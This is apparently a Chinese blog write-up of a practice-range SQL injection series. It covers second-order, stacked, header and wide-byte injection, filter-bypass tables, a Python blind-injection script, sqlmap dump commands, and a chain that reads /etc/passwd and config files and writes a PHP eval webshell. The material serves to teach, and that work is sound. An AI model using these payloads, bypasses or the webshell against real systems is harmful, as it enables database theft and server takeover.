---
title: 好靶场SQLi-2(二次/数据包注入/过滤绕过)
published: 2026-09-19T11:00:00
description: 覆盖二次、堆叠、HTTP 头、宽字节、过滤绕过注入，还有 SQLMap 使用与 MySQL 文件读写 getshell 案例。
tags:
  - 靶场
  - SQL注入
category: 网络安全
draft: false
---

# sql注入-二次注入

注册账号时：

```
账号:admin' and 1=1#
密码:111
邮箱:111@qq.ccc
```

注册成功，使用用户：`admin' and 1=1#`，密码：`111`，进入并修改密码：

```
提示为：`$sql = "UPDATE users SET password='$password' WHERE username='$username'";`
```

修改密码为`hack111`，退出

再次进入登录页面，使用用户：`admin`，密码：`hack111`，登录成功且拿到flag

# sql注入-堆叠注入

```sql
# 忘了是堆叠注入
zhangsan' and extractvalue(1,concat(0x7e,database()))#

# 直接一把过
zhangsan'; select * from flag; #

# 也可以一步步来
zhangsan'; select database(); #
// 因为和之前不同这里还确认了一下库名
zhangsan'; select group_concat(schema_name) from information_schema.schemata; #

zhangsan'; select group_concat(table_name) from information_schema.tables where table_schema='web'; #

zhangsan'; select group_concat(column_name) from information_schema.columns where table_schema='web' and table_name='flag'; #

zhangsan'; select flag from web.flag; #
```

# sql注入-orderby后注入

```sql
id=extractvalue(1,concat(0x7e,database()))

id=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sql_injection_lab')))

id=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='sql_injection_lab' and table_name='flag')))

flag{aca242cd59064877acdf083675e339e0}
id=extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,28)))
id=extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),29,28)))
```

# sql注入-Cookie头注入

懒得打开burp了，直接在浏览器中修改cookie了

```sql
123' and extractvalue(1,concat(0x7e,database())) #

flag{946a71858be949f7ad6f09fbb3eddf74}
# 别的步骤懒得写了，直接拿flag 截断从1然后再改成从第29位就是完整的flag
' and extractvalue(1,concat(0x7e,substr((select group_concat(flag) from flag),1,28))) #
```

# sql注入-Referer头注入

```
Referer: http://hbc2.haobachang.com:18240/' and extractvalue(1,concat(0x7e,database()))#

flag{2adc18685e0840489ff28d977284473a}
```

# sql注入-UA头注入

```
User-Agent: 1'union select 1,2,(select flag from flag),4,5,6 #
```

# sql注入-宽字节注入

其实靶场已经给出答案了

```
admin%df%27 or 1=1 #
```

原理就是字符编码不一致导致转义失效

在预防sql注入时，一般都会对输入的内容进行转义，比如在特殊字符前加`\`，字节为`0x5C`。而此时输入的`'`，字节为`0x27`

此时攻击者只需要使用`%df'`或者经过编码的`%df%27`作为payload，当后端看到`'`时会转义为`0x5C 0x27`，再加上输入的`%df`为`0xDF`，所以当组合起来就变成了：`0xDF 0x5C 0x27`，而`0xDF 0x5C`为一个合法的GBK汉字，所以此时`'`完成了逃逸

需要注意宽字节注入的条件如下：

1. **数据库使用宽字节字符集**：GBK、GB2312、BIG5 等。
    
2. **后端使用了转义函数**：`addslashes`、`mysql_real_escape_string` 等。
    
3. **连接字符集设置错误**：比如 PHP 没执行 `SET NAMES utf8`，导致 MySQL 按 GBK 解析。
    
4. **注入点用单引号或双引号闭合**。

# sql注入-参数base64

布尔盲注数据库名为`web`，那么表和字段也就是`flag`

```python
import requests
import base64

URL = "http://hbc2.haobachang.com:40236/index.php"
TRUE_MARKER = "用户存在"
KEY = "zhangsan"
LENGTH = 38

def is_true(payload):
    # 1. 构造原始 SQL 注入 payload
    raw = f"{KEY}' and {payload} #"
    # 2. Base64 编码（先转 bytes，再编码，最后转回 str）
    encoded = base64.b64encode(raw.encode()).decode()
    # 3. POST 发送，参数名按实际表单字段修改
    data = {"action": "test", "username": encoded}
    r = requests.post(URL, data=data, timeout=10)
    return TRUE_MARKER in r.text

flag = ""
for pos in range(1, LENGTH + 1):
    left, right = 32, 126
    while left <= right:
        mid = (left + right) // 2
        payload = f"ascii(substr((select flag from flag limit 0,1),{pos},1))>{mid}"
        if is_true(payload):
            left = mid + 1
        else:
            right = mid - 1
    ch = chr(left)
    flag += ch
    print(f"pos {pos:2d}: {ch}  ascii={left}  当前flag={flag}")

print("\n最终flag：", flag)
```

# sql注入-注释过滤

只是`#`和`--`被过滤了，用永真作为条件即可

```sql
zhangsan' and extractvalue(1,concat(0x7e,database())) and '1'='1

flag{cecada704e7d4f7993cbfcd52e2f1ce5}
zhangsan' and extractvalue(1,concat(0x7e,substr((select flag from flag),1,28))) and '1'='1
zhangsan' and extractvalue(1,concat(0x7e,substr((select flag from flag),29,28))) and '1'='1
```

# sql注入-and和or被过滤了

使用`逻辑运算符(|| && !)`或者双写、大小写绕过，编码绕过等方式

```
zhangsan' && extractvalue(1,concat(0x7e,database())) #

flag{1b7c1c046a3c4cd3821d5db2ff36788e}
zhangsan' && extractvalue(1,concat(0x7e,substr((select flag from flag),1,28))) #
zhangsan' && extractvalue(1,concat(0x7e,substr((select flag from flag),29,28))) #
```

# sql注入-空格和注释都被我过滤了

过滤规则：

```
$username = preg_replace('/or/i', "", $username);      // 去除 or（不区分大小写）
$username = preg_replace('/and/i', "", $username);     // 去除 and（不区分大小写）
$username = preg_replace('/[\/\*]/', "", $username);   // 去除 /* 和 /
$username = preg_replace('/[--]/', "", $username);     // 去除 --
$username = preg_replace('/[#]/', "", $username);      // 去除 #
$username = preg_replace('/[\s]/', "", $username);     // 去除空格
$username = preg_replace('/[\/\\\\]/', "", $username); // 去除斜杠和反斜杠
```

## 绕过方法

### 绕过空格过滤

|  方法   |         示例         |                说明                |
| :---: | :----------------: | :------------------------------: |
|  注释符  | `select/**/user()` |          用 `/**/` 代替空格           |
|  括号   |  `select(user())`  |           用括号包裹参数，无需空格           |
|  换行符  | `select%0auser()`  |      URL 编码 `%0a`，SQL 解析为空白      |
|  制表符  | `select%09user()`  |           URL 编码 `%09`           |
|  回车符  | `select%0duser()`  |           URL 编码 `%0d`           |
| 垂直制表  | `select%0buser()`  |              较少被过滤               |
|  换页符  | `select%0cuser()`  |              较少被过滤               |
| 不换行空格 | `select%a0user()`  |             特定字符集下有效             |
|  加号   |  `select+user()`   | 仅 `x-www-form-urlencoded` 中解码为空格 |
| 内联注释  | `/*!50000select*/` |         MySQL 版本注释，内容可执行         |

---

### 绕过 OR 过滤

|    方法     |                示例                 |               说明                |
| :-------: | :-------------------------------: | :-----------------------------: |
|    双写     |              `oorr`               |          过滤一次后剩下 `or`           |
|    大小写    |             `oR`、`Or`             |            若过滤区分大小写             |
|  URL 编码   |             `%6f%72`              |             编码 `or`             |
|   注释拆分    |             `o/**/r`              |              中间加注释              |
|   逻辑或符号   |               `\|`                | MySQL 中代替 `OR`（URL 编码 `%7C%7C`） |
|    XOR    |               `XOR`               |             可构造真假条件             |
|    IN     |           `id IN (1,2)`           |        替代 `id=1 OR id=2`        |
|   UNION   |          `UNION SELECT`           |           绕过 WHERE 条件           |
| CASE WHEN | `CASE WHEN 1=1 THEN 1 ELSE 0 END` |             避免使用 OR             |
|   堆叠查询    |          `; SELECT ...`           |             分号执行新语句             |

---

### 绕过 AND 过滤

|    方法     |                示例                 |                说明                |
| :-------: | :-------------------------------: | :------------------------------: |
|    双写     |             `anandd`              |          过滤一次后剩下 `and`           |
|    大小写    |            `aNd`、`AnD`            |             若过滤区分大小写             |
|  URL 编码   |            `%61%6e%64`            |             编码 `and`             |
|   注释拆分    |             `a/**/nd`             |              中间加注释               |
|   逻辑与符号   |               `&&`                | MySQL 中代替 `AND`（URL 编码 `%26%26`） |
|  BETWEEN  |       `id BETWEEN 1 AND 9`        | 替代 `id>1 AND id<10`（内含 AND，需注意）  |
| CASE WHEN | `CASE WHEN 1=1 THEN 1 ELSE 0 END` |             避免使用 AND             |
|    IF     |           `IF(1=1,1,0)`           |             MySQL 函数             |
|   UNION   |          `UNION SELECT`           |           绕过 WHERE 条件            |
|   堆叠查询    |          `; SELECT ...`           |             分号执行新语句              |

采用括号代替空格，双写绕过`or`，逻辑运算符绕过`and`

可以用`union select`：

```
zhangsan'union(select(1),2,3,4,5,6)&&'1'='1

zhangsan'union(select(group_concat(table_name)),2,3,4,5,6)from(infoorrmation_schema.tables)where(table_schema=database())&&'1'='1

zhangsan'union(select(group_concat(column_name)),2,3,4,5,6)from(infoorrmation_schema.columns)where(table_schema=database()&&table_name='flag')&&'1'='1

zhangsan'union(select(flag),2,3,4,5,6)from(flag)'1'='1
```

报错注入：

```
zhangsan'&&extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))))&&'1'='1

flag{12bc30654b1e452ea2744f5ae3dd73bd}
zhangsan'&&extractvalue(1,concat(0x7e,(select(substr((flag),1,28))from(flag))))&&'1'='1
zhangsan'&&extractvalue(1,concat(0x7e,(select(substr((flag),29,28))from(flag))))&&'1'='1
```


# sql注入-UNION和Select都被我过滤了

本来就用的少，还是直接报错注入

```
zhangsan'&&extractvalue(1,concat(0x7e,database()))&&'1'='1

zhangsan'&&extractvalue(1,concat(0x7e,(SeLeCt(group_concat(table_name))from(information_schema.tables)where(table_schema='web'))))&&'1'='1

zhangsan'&&extractvalue(1,concat(0x7e,(SeLeCt(group_concat(column_name))from(information_schema.columns)where(table_schema='web')&&(table_name='flag'))))&&'1'='1

flag{3427ad5f529249aea818391ef9379cdb}
zhangsan'&&extractvalue(1,concat(0x7e,substr((SelECt(flag)from(flag)),1,28)))&&'1'='1
zhangsan'&&extractvalue(1,concat(0x7e,substr((SelECt(flag)from(flag)),29,28)))&&'1'='1
```

# SQLMap攻防01-来啊，用你的SQLMap打死我

```
sqlmap -u "http://hbc2.haobachang.com:1111/search?name=1" --random-agent --batch --dbs 
sqlmap -u "http://hbc2.haobachang.com:1111/search?name=1" --random-agent --batch -D sql_injection_lab --tables 
sqlmap -u "http://hbc2.haobachang.com:1111/search?name=1" --random-agent --batch -D sql_injection_lab -T flag --dump
```

# SQL注入也可以Getshell

## 方法1-速通结果

已知`flag`路径为`/tmp/flag.txt`，直接读取，拿到flag

```
zhangsan' union select 1,2,3,load_file('/tmp/flag.txt'),5 #
```

## 方法2-确认权限

先确认权限，确定为root

```
zhangsan' union select 1,user(),current_user(),3,5 #
```

## 方法2-查看 secure_file_priv 限制(为了写文件)

回显为空，则可以写入任意目录

```
zhangsan' union select 1,2,3,@@secure_file_priv,5 #
```

## 方法2-找网站根目录

这步在实战纯靠猜

```
zhangsan' union select 1,2,3,load_file('/var/www/html/index.php'),5 #
```

以上payload证明了：

1. **数据库用户具有 FILE 权限**  
    `load_file()` 能执行，说明当前 MySQL/MariaDB 用户拥有 `FILE` 权限，可以读取服务器上的文件。
    
2. **目标文件存在且可读**  
    `/var/www/html/index.php` 存在，并且 MySQL 服务进程有权限读取它。如果文件不存在或没权限，`load_file()` 会返回 `NULL`。
    
3. **网站根目录和操作系统线索**  
    路径 `/var/www/html/` 是 Linux 下 Apache/Nginx 的典型 Web 根目录，说明：
    
    - 操作系统很可能是 **Linux**（不是 Windows）。
        
    - Web 服务器可能是 Apache 或 Nginx。
        
    - 网站使用 PHP（因为 `index.php`）。
    
4. **可以获取源码，为 getshell 铺路**  
    读取 `index.php` 能看到：
    
    - 数据库连接配置（用户名、密码、库名）。
        
    - 包含的其他文件路径（如 `config.php`、`functions.php`）。
        
    - 代码逻辑，可能发现更多注入点或文件上传点。
        
    - 网站绝对路径，确认后就能用 `INTO OUTFILE` 写 Webshell。

接下来可以：

- 读 `/etc/passwd` 确认系统用户：
    
    `zhangsan' union select 1,2,3,load_file('/etc/passwd'),5 #`
    
- 读 Web 配置文件找数据库密码：
    
    `zhangsan' union select 1,2,3,load_file('/var/www/html/config.php'),5 #`
    
- 读 Nginx/Apache 配置确认网站根目录：
    
    `zhangsan' union select 1,2,3,load_file('/etc/nginx/sites-enabled/default'),5 #`

目前可以直接写webshell提权，或者使用UDF提权

## 方法2-webshell

这里只是传统方法，也可以使用蚁剑、哥斯拉等等

```
// 这里也可以直接写@system()
zhangsan' union select 1,2,3,'<?php @eval($_GET[cmd]);?>',5 into outfile '/var/www/html/shell_test.php' #
```

最好是再使用load_file确认是否已经写入

```
zhangsan' union select 1,2,3,load_file('/var/www/html/shell_test.php'),5 #
```

url中，因为是使用的`eval`马，GET参数内容为PHP代码，所以不能直接`cat /tmp/flag.txt`，要传`system('cat /tmp/flag.txt');`

```
http://hbc2.haobachang.com:12138/shell_test.php?cmd=system(%27cat%20/tmp/flag.txt%27);
```

到这里就结束了